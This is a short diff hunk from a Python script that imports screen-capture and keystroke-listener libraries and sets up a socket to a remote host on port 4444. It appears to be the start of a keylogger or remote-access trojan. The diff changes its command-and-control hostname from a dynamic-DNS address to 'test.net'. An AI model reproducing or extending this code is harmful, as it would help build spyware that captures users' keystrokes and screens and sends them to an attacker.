@@ -5,7 +5,7 @@ from mss import mss
 from pynput.keyboard import Key, Listener
 import logging
 import requests
-host=socket.gethostbyname('jzero.ddns.net')
+host=socket.gethostbyname('test.net')
 port=4444
 condition=False
 e=socket.socket()
